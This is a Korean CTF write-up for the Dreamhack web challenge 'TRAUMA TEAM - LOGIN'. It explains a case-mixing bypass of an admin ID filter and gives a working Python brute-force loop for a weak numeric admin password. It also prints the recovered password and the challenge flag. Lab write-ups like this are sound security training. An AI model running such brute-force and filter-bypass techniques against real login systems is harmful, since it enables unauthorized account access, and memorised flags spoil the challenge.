---
layout: post
title: "[Dreamhack] TRAUMA TEAM - LOGIN Write-up"
date: 2026-04-10 10:30:00 +0900
categories: [CTF, Reversing, Web]
---

드림핵(Dreamhack) 웹해킹 CTF 문제인 **TRAUMA TEAM - LOGIN** 풀이 라이트업임.

---

# [Dreamhack] TRAUMA TEAM - LOGIN Write-up

## 1. 문제 분석
로그인 페이지가 주어지고, 소스코드를 보면 최종 목표는 `gloria martinez` 계정으로 로그인했을 때 보험 가입 상태(`is_insured`)가 `True`여야 플래그가 출력됨.

### 소스코드 핵심 포인트
```python
# 관리자 비밀번호가 너무 취약함 (0~2000 사이 숫자)
ADMIN_PW = str(random.randint(0, 2000)).zfill(5)

# 유저 데이터
users = {
    "admin": {"pw": ADMIN_PW, "money": 999999, "is_insured": True},
    "gloria martinez": {"pw": "P@ssw0rd", "money": 10, "is_insured": False}
}

# 로그인 로직 - 대소문자 우회 취약점
if user_input == "admin":
    flash("H4cker.. dont access my account!")
    return redirect(url_for('index'))

user_input = (user_input.upper()).lower() # 여기서 admin으로 변환됨
```

- `gloria martinez`는 돈이 10밖에 없어서 스스로 보험을 못 삼(보험료 20,000).
- `admin` 계정은 `/add_insured` 엔드포인트를 통해 다른 유저를 강제로 보험에 가입시킬 수 있음.
- 근데 `id`가 `admin`이면 로그인을 막아놨음. 하지만 `upper().lower()` 처리를 하기 때문에 `admIn`이나 `ADMIN`으로 입력하면 필터를 통과하고 실제로는 `admin` 계정으로 로그인됨.

## 2. 취약점 요약
1.  **ID 필터링 우회:** 대소문자 섞어서 입력하면 `admin` 계정 접근 가능.
2.  **Weak Password (Brute Force):** 관리자 패스워드가 00000~02000 사이라 금방 뚫림.
3.  **관리자 권한 남용:** 관리자로 로그인해서 글로리아를 보험에 가입시키면 끝.

## 3. 익스플로잇 (Exploit)

### STEP 1: 관리자 계정 브루트 포스
`id`를 `admIn`으로 고정하고 패스워드를 00000부터 02000까지 돌려봄.

```python
import requests

url = "http://host3.dreamhack.games:11260/login"
for i in range(2001):
    pw = str(i).zfill(5)
    data = {"id": "admIn", "pw": pw}
    r = requests.post(url, data=data, allow_redirects=False)
    
    # 로그인 성공 시 index로 리다이렉트됨
    if r.status_code == 302 and "login" not in r.headers.get("Location", ""):
        print(f"Admin PW Found: {pw}")
        break
```
- 실행 결과, 패스워드는 **`01106`**이었음.

### STEP 2: 보험 가입 및 플래그 획득
1.  `admIn` / `01106`으로 로그인 성공.
2.  관리자 전용 기능인 `ENROLL SUBJECT`에 `gloria martinez` 입력하고 실행.
    - 요청 URL: `/add_insured?target=gloria martinez`
3.  로그아웃 후 `gloria martinez` / `P@ssw0rd`로 재로그인.
4.  대시보드 상단에 플래그 출력됨.

## 4. 결과
- **Flag:** `SP{Bu1_1tS_t0O_l41te_glorya}`

---

### 느낀점
`upper().lower()`를 이용한 대소문자 우회는 꽤 자주 나오는 패턴인 듯. 비밀번호 범위가 좁으면 일단 브루트 포스부터 박고 보는 게 답인 것 같음. 끝.
